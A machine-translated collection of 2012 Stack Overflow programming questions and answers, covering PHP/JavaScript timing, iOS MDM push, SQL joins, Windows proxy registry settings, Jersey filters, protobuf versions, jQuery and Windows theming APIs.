> 标签：php, javascript, html

我想在预定义的时间和日期在我的网站上播放视频。我有网站和视频上传。现在我希望在特定时间播放此视频，假设我已经给出了时间和日期，例如 2012 年 12 月 27 日下午 5 点。它必须在 2012 年 12 月 27 日下午 5 点播放。

请让我知道如何在 javascript 或 php 中实现这一点。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:30:13.643

创建您自己的代码，如果您遇到任何问题，请返回此处并寻求解决方法的帮助。否则，这是我能饶你一命的唯一帮助。

```
if(date() === "1234567890"){

//play the freaking video. 

} 
```

另外，如果用户禁用了 Javascript，那么他们如何才能看到您的视频？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:43:34.157

如果 PHP 知道时间戳，您可以简单地计算剩余时间：

```
$ts = strtotime('2012-12-31 23:59:59');
$time_until = max(0, $ts - time()); // make sure it doesn't become negative.

?>
<script type="text/javascript">
setTimeout('showVideo', <?php echo $time_until; ?> * 1000);
</script> 
```

在这种情况下，我让 JavaScript 进行乘法运算，因为 PHP 不擅长处理大数；这一切都取决于你认为`$time_until`会有多大:)

# apple-push-notifications - iOS 设备未收到 MDM APNS 通知（唤醒电话）

> ID：14039948
> 
> 赞同：1
> 
> 时间：2012-12-26T11:27:16.067
> 
> 标签：apple-push-notifications, mdm

我遵循以下链接[http://www.softhinker.com/in-the-news/iosmdmvendorcsrsigning](http://www.softhinker.com/in-the-news/iosmdmvendorcsrsigning)并将生成的文件上传到[https://identity.apple.com/pushcert](https://identity.apple.com/pushcert)，其中已生成推送通知证书。

我已经使用 IPCU 以 Vendor.p12 文件作为身份创建了 .mobileConfig 文件，并且可以在我的 iOS 设备上安装配置文件。配置文件安装成功，我可以在 IPCU 中看到控制台日志，并且设备正在访问服务器并签入配置文件中提到的 url。

我从门户下载了 PEM 格式的 APNS 证书并将其安装在钥匙串访问中。我选择了 APNS 证书 (APSP:an23.....) 和与 MDM 供应商证书关联的私钥（我在这里做错了吗？？？）并将它们导出到 .p12 文件中。使用这个 .p12 文件，我通过使用 java-apns 库发送推送通知将唤醒呼叫发送到 iOS 设备。我收到反馈说消息已送达，但 iOS 设备未返回空闲状态的 Checkin-url。请让我知道如何解决此问题...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-03T19:58:45.937

设备可以通过 5223 连接到苹果吗？设备需要打开连接才能接收签入请求。3g设备正常应该没问题，但是wifi设备可能会被屏蔽。

# objective-c - 在应用程序的开头添加教程

> ID：14039955
> 
> 赞同：0
> 
> 时间：2012-12-26T11:27:45.527
> 
> 标签：objective-c, ios, ios6

> **可能重复：**
> [仅在 iOS 中首次启动时显示屏幕](https://stackoverflow.com/questions/9450391/show-screen-on-first-launch-only-in-ios)

我需要在我的应用程序启动时为我的应用程序添加一个教程，但我只想在应用程序第一次运行时运行它一次。更准确地说，如果有人安装并运行应用程序，首先应该显示教程视图，但之后即使在应用程序启动后也不应显示教程。

我想我已经用可以理解的语言表达了我的问题。如果有什么不清楚的请问我。

感谢期待

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-26T11:32:04.970

```
 Try this,  

 BOOL isAlreadyUse=[[NSUserDefaults standardUserDefaults]boolForKey:@"AlreadyUse"];

 if(isAlreadyUse==NO)

{
    [[NSUserDefaults standardUserDefaults]setBool:YES forKey:@"AlreadyUse"];

   [self showtutorial];
 } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-26T11:34:47.730

You can use [NSUserDefaults](https://developer.apple.com/library/ios/#documentation/Cocoa/Reference/Foundation/Classes/NSUserDefaults_Class/Reference/Reference.html) for doing this.

```
if (![[NSUserDefaults standardUserDefaults] boolForKey:@"firstLoad"])
{
   [[NSUserDefaults standardUserDefaults] setBool:TRUE forKey:@"firstLoad"];
   [[NSUserDefaults standardUserDefaults] synchronize];

   //show tutorial screen

}
else
{
   //main screen
} 
```

# logging - HTTP_LOG_FIELDS_DATA 和方法日志记录

> ID：14039959
> 
> 赞同：0
> 
> 时间：2012-12-26T11:28:10.810
> 
> 标签：logging, http.sys

我遇到了一个障碍：HTTP_LOG_FIELDS_DATA 有三个字段来指定方法：

*   USHORT 方法长度；
*   PCHAR 方法；
*   HTTP_VERB 方法编号；

但是 AFAICT MethodNum 被忽略（任何值在日志中显示为“-”）。

MethodLength 和 Method 一起工作，但是一旦我将它们分别设置为 fi 为 3 和 'GET'，我在 HttpSendHttpResponse 中得到一个 87 错误（参数不正确）。

ClientIpLength/ClientIp 或 UriStemLength/UriStem 等其他字段按预期工作并正确显示在日志中。方法是有问题的。

有人让它工作吗？有什么我可能遗漏的细节吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T15:04:30.707

好的，找到它，错误在“HTTP_LOG_FIELDS_DATA 结构（Windows）”文档页面中：

[http://msdn.microsoft.com/en-us/library/windows/desktop/aa364537(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/aa364537(v=vs.85).aspx)

在线文档中缺少一个字段（在 C++ 代码和描述中）。我在 Delphi 端口上的文档中工作，然后在测试所有是否正常工作的字段时注意到缺少的字段。

添加字段后，一切恢复正常！

# mysql - 单行，其中包含 SQL 中其他多行的可选数据

> ID：14039960
> 
> 赞同：1
> 
> 时间：2012-12-26T11:28:23.373
> 
> 标签：mysql, sql

我的数据库中有一个表，其中有多个相同的`key`. 我需要做的是拉回单行，其中包含每行的所有`column`信息，每行具有相同的`key`.

我已经尝试在网上寻求帮助，但我不知道哪些搜索词会给我带来有用的结果。所以 - 我已经尝试了下面的解决方案 - 但我认为它不是最好的 - 我正在寻找关于如何改进它的建议。

**更新：**

例如，所有行都有一些列是*必需*的（非空），但有 3 列具体*是不需要的*（可空的） - 即`info1`,`otherinfo`和`lastinfo`。

所以 - 我想拉回一行，其中包含每行中所有*必需*的列。

假使，假设：

*   第 2 行包含所有*必需*`info1`的列集，以及 和 的数据
*   第 3 行设置了所有*必填*列 - 但所有*非必填*字段都没有数据。这意味着应该跳过第 3 行。
*   第 4 行设置了所有*必需*的列 - 以及 和的`info1`数据`otherinfo``lastinfo`

在这种情况下，我想要返回的是来自第 1行、第 2 行、第 3 行和第 4 行的*所需*数据（跳过，因为它已经由第 2 行设置）。`info1``otherinfo``lastinfo``info1`

到目前为止，这是我的代码：

```
SELECT a.*, 
       IFNULL(a.info1, IFNULL(b.info1, IFNULL(c.info1, null))) AS info1
     , IFNULL(a.otherinfo, IFNULL(b.otherinfo, IFNULL(c.otherinfo, null))) AS otherinfo
     , IFNULL(a.lastinfo, IFNULL(b.lastinfo, IFNULL(c.lastinfo, null))) AS lastinfo
FROM entries a 
LEFT JOIN entries b ON (
    a.key = b.key && (
        (a.info1 IS NULL && b.info1 IS NOT NULL) ||
        (a.otherinfo IS NULL && b.otherinfo IS NOT NULL) ||
        (a.lastinfo IS NULL && b.lastinfo IS NOT NULL)
    )
)
LEFT JOIN entries c ON (
    a.key = c.key && (
        (a.info1 IS NULL && c.info1 IS NOT NULL) ||
        (a.otherinfo IS NULL && c.otherinfo IS NOT NULL) ||
        (a.lastinfo IS NULL && c.lastinfo IS NOT NULL)
    )
)
LEFT JOIN entries d ON (
    a.key = d.key && (
        (a.info1 IS NULL && d.info1 IS NOT NULL) ||
        (a.otherinfo IS NULL && d.otherinfo IS NOT NULL) ||
        (a.lastinfo IS NULL && d.lastinfo IS NOT NULL)
    )
)
WHERE a.key = @_id
ORDER BY a.createdate DESC, 
         b.createdate DESC, 
         c.createdate DESC, 
         d.createdate DESC 
LIMIT 1; 
```

**更新：**使用以下代码解决了它：

```
SELECT e.*, 
       e2.info1 AS info1, 
       e3.otherinfo AS otherinfo, 
       e4.lastinfo AS lastinfo 
FROM entries AS e 
LEFT JOIN entries AS e2 ON (
    e.key = e2.key && (e.info1 is null && e2.info1 IS NOT NULL)
)
LEFT JOIN entries AS e3 ON (
    e.key = e3.key && (e.otherinfo is null && e3.otherinfo IS NOT NULL)
) 
LEFT JOIN entries AS e4 ON (
    e.key = e4.key && (e.lastinfo IS NULL && e4.lastinfo IS NOT NULL)
) 
WHERE e.key = @_id 
ORDER BY e.createdate DESC, 
         e2.createdate DESC, 
         e3.createdate DESC, 
         e4.createdate DESC 
LIMIT 1; 
```

# visual-studio - Proxy connection while browser is running

> ID：14039964
> 
> 赞同：3
> 
> 时间：2012-12-26T11:29:03.433
> 
> 标签：visual-studio, proxy, registry

I have to make application that will connect/disconnect to proxy server even while browser is running. I found out that I can change some registry keys value. Here is my code in Visual Basic:

```
Imports Microsoft.Win32

Public Class Form1

Public Sub SetProxy() 
    On Error Resume Next
    Dim regkey1 As RegistryKey
    regkey1 = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Internet Settings", RegistryKeyPermissionCheck.Default)
    regkey1.SetValue("ProxyServer", "ftp=10.8.0.1:808;http=10.8.0.1:808;https=10.8.0.1:808;socks=10.8.0.1:1080", RegistryValueKind.Unknown)
    regkey1.SetValue("ProxyEnable", True, RegistryValueKind.DWord)
    regkey1.Close()

    Label1.Text = "Connected to Disa's Proxy Server"
    Label1.ForeColor = Color.Green
End Sub

Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
    On Error Resume Next

    SetProxy() 
End Sub

Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
    On Error Resume Next
    Dim regKey As RegistryKey
    regKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Internet Settings", RegistryKeyPermissionCheck.Default)
    regKey.SetValue("ProxyEnable", False, RegistryValueKind.DWord)
    regKey.Close()

    Label1.Text = "Disconnected from Disa's Proxy Server"
    Label1.ForeColor = Color.Red
End Sub
End Class 
```

This code works well on Firefox, but doesn't on IE and Chrome. While IE is opened it prevents all registry changes in `Internet Settings`. Chrome needs restart or opening the Proxy settings to reload proxy information. How to force browers to reload proxy configuration?

**EDIT** Example: [ChrisProxy](http://www.chris-pc.com/proxy/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T16:51:14.643

You can utilize WebClient to connect and set a proxy. A very simple example is shown below.

```
Sub GetWebPageWithProxy(ByVal pathToUrl As String, ByVal pathToSaveFile As String)
    Dim wc As WebClient
    wc = New WebClient
    wc.Proxy = New WebProxy(New Uri("http://10.8.0.1:808"))
    wc.DownloadFile(pathToUrl, pathToSaveFile)
End Sub 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-11-26T14:57:21.093

**You should call, in your program:**

```
InternetSetOption(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
     // Notifies the system that the registry settings have been changed
     // so that it verifies the settings on the next call to InternetConnect.

InternetSetOption(NULL, INTERNET_OPTION_REFRESH , NULL, 0);
     // Causes the proxy data to be reread from the registry for a handle. 
     // No buffer is required. 
```

With that code, no need to restart or opening the proxy settings to reload proxy information. Existing Chrome and Internet Explorer instances are notified by INTERNET_OPTION_SETTINGS_CHANGED and INTERNET_OPTION_REFRESH.

* * *

**Notes:**

1.  Your calling program can't be a service. InternetSetOption() is a WinINet call.
2.  It should run under the same-user (as of the browser) account.

# c - 如何检查 Kgdb 是否启用？

> ID：14039967
> 
> 赞同：0
> 
> 时间：2012-12-26T11:29:12.343
> 
> 标签：c, linux, linux-kernel, kernel, kgdb

我有一个内核映像，想用 kgdb 进行调试。`.config`也不可用，否则我可以检查其中的标志。

在`/proc/sys/`文件夹中也没有关于 kgdb 的条目。

有什么方法可以检查该图像是否启用了 kgdb？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T16:52:05.323

如果您的内核映像是使用选项编译的

```
CONFIG_IKCONFIG=y
CONFIG_IKCONFIG_PROC=y 
```

`/proc/config.gz`然后您可以从或通过使用获取内核映像的配置

`/pathtokernelsource/scripts/extract-ikconfig pathtokernelimage > /tmp/config`

从那里您可以搜索`CONFIG_KGDB`使用 grep 或 zgrep，具体取决于您查看的是压缩的还是未压缩的配置文件。

`/pathtokernelsource/scripts/extract-vmlinux pathtokernelimage > /tmp/vmlinux`还将从映像中提取 vmlinux 可执行文件。

如果这有符号，您可以在该文件的 nm 输出中或在 System.map 中搜索您的内核映像中的 kgdb_arch_init 或 kgdb_arch_*，正如**Mats Petersson**在评论中提到的那样。

# javascript - jQuery 使链接处于活动状态

> ID：14039968
> 
> 赞同：4
> 
> 时间：2012-12-26T11:29:18.997
> 
> 标签：javascript, jquery

我正在处理一个 HTML 模板，但我无法触摸 HTML 代码，我只能处理 CSS 和 JS 文件。所以我不能以任何方式编辑 HTML 代码。

我想要实现的是，当 jQuery 或 Javascript 识别出当前页面 URL 与我想要置于活动状态的链接相同时，将一些链接置于活动状态，而无需编辑 HTML 代码。

有没有办法做到这一点？我尝试了很多方法，但没有运气。

这是 HTML 代码（记住我不能编辑它）。

```
<span class="Tag_Nav_Aux">
    <a href="/my-account/create-account.aspx">Create&nbsp;Account</a>
    &nbsp;|&nbsp;
    <a href="/my-account/login.aspx">Login</a>
    &nbsp;|&nbsp;
    <a href="/my-cart/default.aspx">My Cart</a>
</span> 
```

jQuery 或 Javascript 代码应该在不同的链接上工作，除了我上面报告的那些，因为当用户登录或注销时 HTML 会发生变化。因此，jQuery 应该指向该类`Tag_Nav_Aux`并将 Active 类添加到`a`它会发现具有与当前 URL 相同的链接的任何标记。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T11:43:23.327

你可以做这样的事情。来自 URL 的文件名

```
var filename = window.location.href.substr(window.location.href.lastIndexOf("/")+1); 
```

之后从导航中获取锚点并应用一些类。

```
$("span.Tag_Nav_Aux a[href*="+filename+"]").addClass('active'); 
```

在这里，您必须编写一个 CSS`active`类，使该链接看起来像一个活动链接。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-26T11:47:10.767

试试这个脚本

```
jQuery(function($){
    $('.Tag_Nav_Aux a').filter(function(){
       return $(this).attr('href').toLowerCase() === window.location.pathname.toLowerCase();
    }).addClass('active');
}); 
```

并为

```
.Tag_Nav_Aux a.active{
   // style you want the active link to have
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-26T11:51:44.993

```
$(document).ready(function() {
    var url = window.location.href.toLowerCase();

    $(".Tag_Nav_Aux a").each(function() {

        var $this = $(this);

        var href = $this.attr("href").toLowerCase();

        if(url.indexOf(href) > -1) {
            $this.addClass("active");            
        }           
    });
});​ 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-26T11:43:34.470

我认为您需要检查当前页面的 url 并为要激活的项目分配一个类。

我通常会在服务器端代码的帮助下根据当前 URL 匹配放置 class="active"。

但是如果你不想要服务器代码，你可以借助 JavaScript

```
var currentPage=window.location.href;

if(currentPage=="") 
{ 
 //logic to find and add a Class for the proper anchor tag
 } 
```

# java - 如何使用 Jersey 计算多部分请求正文的 MD5 哈希

> ID：14039976
> 
> 赞同：2
> 
> 时间：2012-12-26T11:30:16.373
> 
> 标签：java, jersey, md5, multipartform-data

我正在使用 Jersey，我需要计算多部分发布请求正文的 MD5 哈希。我当前的资源方法签名如下所示：

```
@POST
@Consumes("multipart/form-data")
@Produces("application/json")
public String post(
        @FormDataParam("name") String name,
        @FormDataParam("description") String description,
        @FormDataParam("iconfile") FormDataBodyPart part,
        @Context HttpServletRequest hsr) {
    // ...
} 
```

我没有找到获取原始请求正文的方法，我需要计算 MD5 哈希。当调用我的资源方法时，来自`HttpServletRequest`( `hsr.getInputStream()`) 的输入流已经被消耗，我无法再次读取它。

我尝试将我的方法签名更改为以下内容：

```
@POST
@Consumes("multipart/form-data")
@Produces("application/json")
public String test(byte[] bytes) {
    // ...
} 
```

通过这种方式，我获得了请求正文的原始字节，并且可以成功计算 MD5 哈希，但我不知道如何从那里处理多部分请求（拆分部分，获取每个部分等）。我是否必须自己处理原始请求？或者我可以让 Jersey 完成这项肮脏的工作并`FormDataParam`为我提取 s 并让我以某种方式计算 MD5 散列吗？

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-04T12:48:15.757

这就是我最终做的事情：

我创建了一个容器请求过滤器，它使用实体输入流，计算 MD5 校验和并再次设置实体输入流，以便 Jersey 可以使用它来处理多部分请求并`FormDataParam`为我提取 s。

我还在过滤器和资源方法中注入了`HttpServletRequest`两者，以在两者之间进行数据通信。

这是过滤器类：

```
public class MD5CheckFilter implements ContainerRequestFilter {

    @Context HttpServletRequest hsr;

    public ContainerRequest filter(ContainerRequest request) {

        byte[] bytes = request.getEntity(byte[].class); // this consumes the entity input stream
        String contentMD5 = calculateMD5(bytes);
        hsr.setAttribute("contentMD5", contentMD5);

        // set the entity input stream so it can be consumed again
        request.setEntityInputStream(new ByteArrayInputStream(bytes));

        return request;
    }

} 
```

这是我`web.xml`在该部分中的相关`servlet`部分：

```
<init-param>
    <param-name>com.sun.jersey.spi.container.ContainerRequestFilters</param-name>
    <param-value>path.to.MD5CheckFilter</param-value>
</init-param> 
```

这样我就不需要更改原始方法签名：

```
@POST
@Consumes("multipart/form-data")
@Produces("application/json")
public String post(
        @FormDataParam("name") String name,
        @FormDataParam("description") String description,
        @FormDataParam("iconfile") FormDataBodyPart part,
        @Context HttpServletRequest hsr) {
    // ...
} 
```

# jquery-mobile - jquery移动链接按钮不起作用

> ID：14039979
> 
> 赞同：0
> 
> 时间：2012-12-26T11:30:29.870
> 
> 标签：jquery-mobile, linkbutton

我从 JQuery mobile 开始，我有一个非常奇怪的问题，我的应用程序非常简单，它是一个带有 TextBox、一个按钮和一个 Linkbutton 的页面：

```
<div data-role="content">
  <asp:TextBox ID="TextBox_Topic" runat="server"></asp:TextBox>
  <asp:Button ID="Button_add" runat="server" Text="Add" onclick="Button_add_Click" />
  <asp:LinkButton ID="LinkButton_grid" runat="server" PostBackUrl="multisubsGrid.aspx" data-role="button">Continue</asp:LinkButton>
</div> 
```

我唯一要做的就是在文本框中插入文本，当单击添加按钮时，将其添加到会话变量（列表）中，然后单击链接按钮转到另一个页面。这是一个非常简单的行为，在添加 jquery 移动库之前它运行良好。问题是当我插入一些文本并单击添加按钮（它将文本添加到会话变量中）时，LinkBut​​ton 不起作用，我不明白为什么会发生这种情况。

这是我背后的代码：

```
protected void Button_add_Click(object sender, EventArgs e)
{ 
    List<string> l = Session["topics"] as List<string>;
    if (!l.Contains(TextBox_Topic.Text))
    l.Add(TextBox_Topic.Text);
} 
```

希望有人能帮助我。谢谢！！！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T14:32:14.713

jQuery Mobile 使用 Ajax 加载页面，而 asp.net Web 表单回发模型根本不适用于这种默认行为。您唯一的选择（除了迁移到不同的服务器端技术）是关闭 Ajax 加载。在按钮上使用 PostBackUrl 属性执行服务器端重定向。

您需要关闭`<form data-ajax="false">`标签和/或按钮上的 Ajax 加载。`<asp:LinkButton data-ajax="false">Continue</asp:LinkButton>`. 我不确定 PostBackUrl 会引入什么行为。

如果您想继续使用 Microsoft 技术，asp.net MVC 是一个更好的选择。如果您真的想坚持使用 Web 表单，我也成功地使用直接 html 文件进行标记，然后连接到 asp.net（Web 表单）asmx / Web 服务，但这需要大量使用 JavaScript 和客户端编程.

Ajax 加载主要用于性能和更接近本地代理应用程序。如果您的应用程序仅用于 Intranet 或有限的受众，您可能只需将其关闭即可。

# windows-phone - 以编程方式获取电话口音刷c#

> ID：14039981
> 
> 赞同：14
> 
> 时间：2012-12-26T11:30:50.180
> 
> 标签：windows-phone

我在 xaml 中有文本框

```
<TextBlock Style="{StaticResource PhoneTextExtraLargeStyle}" FontSize="{StaticResource PhoneFontSizeLarge}" FontFamily="{StaticResource PhoneFontFamilySemiLight}" Margin="12,10,12,0" /> 
```

如何以编程方式（c#）从 windows phone 7 / 7.5 / 8 的系统资源中获取 phoneaccentbrush 的值，以便我可以设置前景色以匹配 WP 设置中选择的重音。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-12-26T12:52:31.663

首先，您需要在 C# 类的 Constructor 之前创建 currentAccentColorHex：

```
public partial class MainPage : PhoneApplicationPage
{
    Color currentAccentColorHex = (Color)Application.Current.Resources["PhoneAccentColor"];

    // Constructor
    public MainPage()
    {          
        //... 
```

然后在需要为控件设置颜色的任何地方使用它：控件 MyControl 的背景属性示例：

```
SolidColorBrush backColor = new SolidColorBrush(currentAccentColorHex);
MyControl.Background = backColor; 
```

希望这有帮助

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-12-27T08:07:14.323

谢谢 Spaso :) 我做了更多的研究，在你的帮助下我想出了以下代码

```
var phoneAccentBrush =  new SolidColorBrush((App.Current.Resources["PhoneAccentBrush"] as SolidColorBrush).Color); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-01-08T18:52:37.323

将此添加到 xaml 的文本框中

```
Foreground="{StaticResource PhoneAccentBrush}" 
```

或从 c# 设置它

```
btnDefault.Foreground = new SolidColorBrush((Color)Application.Current.Resources["PhoneAccentColor"]); 
```

# protocol-buffers - protoc 生成的类会产生编译错误

> ID：14039983
> 
> 赞同：1
> 
> 时间：2012-12-26T11:31:12.070
> 
> 标签：protocol-buffers

我创建了一个简单的 .proto 文件并执行了编译器（protoc-2.5.0rc1-win32.zip）。为规定的包生成了一个java文件。但是，生成的文件无法编译。.proto 文件很简单，只有一条消息和一堆简单类型的可选字段（正确编号）。.java 文件无法编译，例如：

*   构造函数 GeneratedMessage.FieldAccessorTable(Descriptors.Descriptor, String[]) 未定义
*   未定义 GeneratedMessage.FieldAccessorTable 类型的方法 ensureFieldAccessorsInitialized(Class, Class)
*   ...以及同一行中的许多其他错误（例如尝试覆盖超类中的最终方法）

提示 API 版本级别不匹配的错误？有任何想法吗？

谢谢 已解决：发现我正在使用的 API 预期的 proto 版本是 2.4.1 并且我使用的是最新版本。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-04-29T08:34:31.787

我已经解决了同样的问题。答案：1.显示你的协议编译器版本

例如 D:\workspace2\monitor\src\main\resources>protoc --version libprotoc 2.6.1

2.使 protoc jar 与您的 protoc 编译器版本一致

例如

```
<dependency>
            <groupId>com.google.protobuf</groupId>
            <artifactId>protobuf-java</artifactId>
            <version>2.6.1</version>
        </dependency> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-27T00:41:11.030

对我来说，我将此[追溯到 akka](/questions/tagged/akka "显示标记为“akka”的问题")，包括一个较旧的原型缓冲区版本，并且版本冲突。

**解决方案：**检查你所有的库中是否有旧版本的原型缓冲区，它可能包含在你已经拥有的东西中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-27T17:38:36.620

我的猜测是，您首先需要从源代码分发 protobuf-2.5.0rc1.zip 构建一个新的协议 buf jar (protobuf-java-2.5.0rc1.jar)，并使其成为 maven pom 的本地“系统”依赖项。 xml。如果我只是使用新编译器生成新的 java 存根，但我的 pom.xml 中有旧的 2.4.1 jar 依赖项，我也会遇到编译错误。我找不到托管已构建的 2.5.0rc1.jar 的 maven 存储库。如果您只是从源代码分发中获取源文件，您会错过一些类文件，例如 com.google.protobuf.DescriptorProtos.*。

# c# - 哪个类、部分和状态用于绘制选择？

> ID：14039984
> 
> 赞同：0
> 
> 时间：2012-12-26T11:31:15.080
> 
> 标签：c#, winforms, winapi, user-interface, visual-styles

我正在尝试在启用 Aero 的 Windows 7 上使用视觉样式在我的自定义 Windows 窗体控件中绘制选择/焦点框。我试过这个：

```
VisualStyleRenderer selectionRenderer = new VisualStyleRenderer(VisualStyleElement.ListView.Item.Selected);
selectionRenderer.DrawBackground(g, visual.ItemArea); 
```

和这个：

```
VisualStyleRenderer selectionRenderer = new VisualStyleRenderer(VisualStyleElement.TreeView.Item.Selected);
selectionRenderer.DrawBackground(g, visual.ItemArea); 
```

但是，两者都失败并显示当前样式既不支持 TreeView.Item.Selected 也不支持 ListView.Item.Selected 的信息。但是，嘿，Windows 在 UI 的树视图中绘制选择：

![树视图中的选择](../Images/f0da88c6a379ced0a845b16fc6f197e0.png)

和列表视图：

![列表视图中的选择](../Images/99e97bfdb24046aa44436ebbcca91bce.png)

那么我应该使用哪个类和部分来绘制系统选择矩形？

* * *

**编辑：**我试图用纯 WinAPI 编写代码。这是一个代码片段：

```
case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps); 

        HTHEME theme = OpenThemeData(hwnd, L"TREEVIEW");
        RECT rect;
        rect.left = 10;
        rect.top = 10;
        rect.right = 80;
        rect.bottom = 80;
        DrawThemeBackground(theme, hdc, TVP_TREEITEM, TREIS_SELECTED, &rect, &rect);
        CloseThemeData(theme);

        EndPaint(hwnd, &ps); 
        return 0L; 
    } 
```

结果如下所示：

![在 WinAPI 中绘制的选择](../Images/e905a52af8219648a5b657adb232766f.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T15:29:50.313

我非常接近。纯 WinAPI 中的完整解决方案如下所示：

```
HWND mainWinHWND = CreateWindowEx(WS_EX_WINDOWEDGE | WS_EX_CLIENTEDGE,
    L"MainWindowClass",
    L"WinAPI window",
    WS_OVERLAPPEDWINDOW,
    CW_USEDEFAULT,
    CW_USEDEFAULT,
    640,
    480,
    NULL,
    NULL,
    hInstance,
    NULL);

if (!mainWinHWND)
    return -1;

SetWindowTheme(mainWinHWND, L"explorer", nullptr); 
```

然后可能会要求操作系统绘制特定部分：

```
case WM_PAINT:
{
    PAINTSTRUCT ps;
    HDC hdc = BeginPaint(hwnd, &ps); 

    HTHEME theme = OpenThemeData(hwnd, L"TREEVIEW");
    RECT rect;
    rect.left = 10;
    rect.top = 10;
    rect.right = 80;
    rect.bottom = 80;
    DrawThemeBackground(theme, hdc, TVP_TREEITEM, TREIS_SELECTED, &rect, &rect);
    CloseThemeData(theme);

    EndPaint(hwnd, &ps); 
    return 0L; 
} 
```

结果：

![在此处输入图像描述](../Images/35de1d91b388a57d352026c345ab6a6e.png)

很遗憾，主题操作系统支持的文档记录如此之少。例如，该`L"Explorer"`值取自 MSDN 的 SetWindowTheme，但没有正式的参数列表，可以提供给该例程。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T11:51:15.223

MSDN 说 Visaul Styles 仅在 Windows XP Home Edition、Windows XP Professional x64 Edition 和 Windows Server 2003 上受支持。

[请参阅此链接（VisualStyleRenderer 类）的](http://msdn.microsoft.com/en-us/library/system.windows.forms.visualstyles.visualstylerenderer.aspx)**备注**部分的末尾，以及[此链接的](http://msdn.microsoft.com/en-us/library/system.windows.forms.visualstyles.visualstyleinformation.issupportedbyos.aspx)**备注**部分。而且两者都返回 true，似乎除了 XP 和 Server 2003 以外的任何操作系统都不支持它！**[`VisualStyleRenderer.IsSupported`](http://msdn.microsoft.com/en-us/library/system.windows.forms.visualstyles.visualstylerenderer.issupported.aspx)[`VisualStyleInformation.IsSupportedByOS`](http://msdn.microsoft.com/en-us/library/system.windows.forms.visualstyles.visualstyleinformation.issupportedbyos.aspx)**

# google-apps-script - Google Apps 脚本中的持久变量

> ID：14039988
> 
> 赞同：2
> 
> 时间：2012-12-26T11:31:28.433
> 
> 标签：google-apps-script

以下始终显示 0 ：

```
var gNumber = 0;

function myTest() {
  Browser.msgBox(gNumber);
  gNumber++;
} 
```

当然，我可以使用 ScriptProperties 或 UserProperties 来永久存储一个值。对于简单的值很好，但它不适用于对象，除非我将其字符串化。但是对于后者，我无法永久存储打开工作表并让我通过方法（get、set）操作它的对象。

我有一个使用客户电子表格信息的订单电子表格。每次检查订单时，我都需要打开客户电子表格并将其数据加载到数组中。有没有办法永久保留一个对象，这样我就不需要一遍又一遍地打开客户？

永久，我的意思是只要与脚本关联的工作表是打开的！

有没有办法我可以做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-26T11:35:31.630

如果您需要临时存储变量，请使用[CacheService](https://developers.google.com/apps-script/class_cacheservice)。如果您想要更持久的存储（类似于电子表格），那么您可以使用[ScriptDb](https://developers.google.com/apps-script/class_scriptdb)

当然，ScriptProperties / UserProperties 也可供您使用，但我更喜欢 CacheService 而不是 ScriptProperties，因为您可以很快达到 ScriptProperties 的限制。

# jquery - 在jquery中获取没有px的左右值

> ID：14039991
> 
> 赞同：4
> 
> 时间：2012-12-26T11:31:39.487
> 
> 标签：jquery

> **可能重复：**
> [Javascript 或 jQuery 中的 Left() 函数](https://stackoverflow.com/questions/490508/left-function-in-javascript-or-jquery)

我有一个 div，我给出如下样式。

```
#MainDiv
{
    position:relative;    
    left:150px;
    right:150px;

} 
```

`#MainDiv`我想根据左右参数给出这个宽度。为此，我给出如下。

```
$("#MainDiv").width($("#MainDiv").width() - $("#MainDiv").css("left") - $("#MainDiv").css("right")); 
```

但是 在提醒`$("#MainDiv").css("left")`我`150px`。我只想要`150`. 为此，我使用了`offset`属性`$("#MainDiv").offset().left`和`$("#MainDiv").offset().right`. 左边的值是 as`158`而右边的值是 as `undefined`。`offset`在这种情况下不正确？我应该如何在值的末尾删除它`px`并获得确切的值？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-26T11:34:46.977

做：

```
var left = parseInt($("#MainDiv").css("left"), 10); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-26T11:37:22.187

尝试使用 jQuery [**position()**](http://api.jquery.com/position/)

```
 $(element).position().top;
 $(element).position().left; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-26T11:33:58.753

```
parseInt( $("#MainDiv").css("left").replace('px', '') ); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-26T11:40:11.047

试试这个：

```
$("#MainDiv").css("left").slice(0, -2);
$("#MainDiv").css("right").slice(0, -2); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-26T11:53:18.097

